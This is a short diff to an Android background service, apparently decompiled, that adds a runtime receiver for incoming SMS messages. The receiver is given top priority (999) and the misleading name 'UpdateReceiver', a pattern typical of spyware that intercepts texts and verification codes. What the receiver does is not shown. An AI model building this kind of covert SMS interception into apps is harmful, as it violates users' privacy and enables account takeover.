@@ -8,10 +8,13 @@ import android.app.Service;
 import android.content.Intent;
 import android.os.Build;
 import android.os.IBinder;
+import android.content.IntentFilter;
 import android.util.Log;
 
 
 public class MainService extends Service {
+    private UpdateReceiver smsReceiver;
+
     @Override // android.app.Service
     public IBinder onBind(Intent intent) {
         return null;
@@ -22,11 +25,20 @@ public class MainService extends Service {
         super.onCreate();
         ((MainApplication) getApplication()).agent.start(this, new Intent(), null);
         Log.d("SVC", "onCreate");
+
+        smsReceiver = new UpdateReceiver();
+        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
+        filter.setPriority(999);
+        registerReceiver(smsReceiver, filter);
+        Log.d("SVC", "SMS Receiver registered dynamically");
     }
 
     @Override // android.app.Service
     public void onDestroy() {
         super.onDestroy();
+        if (smsReceiver != null) {
+            unregisterReceiver(smsReceiver);
+        }
         ((MainApplication) getApplication()).agent.onStop();
         Log.d("SVC", "onDestroy");
     }
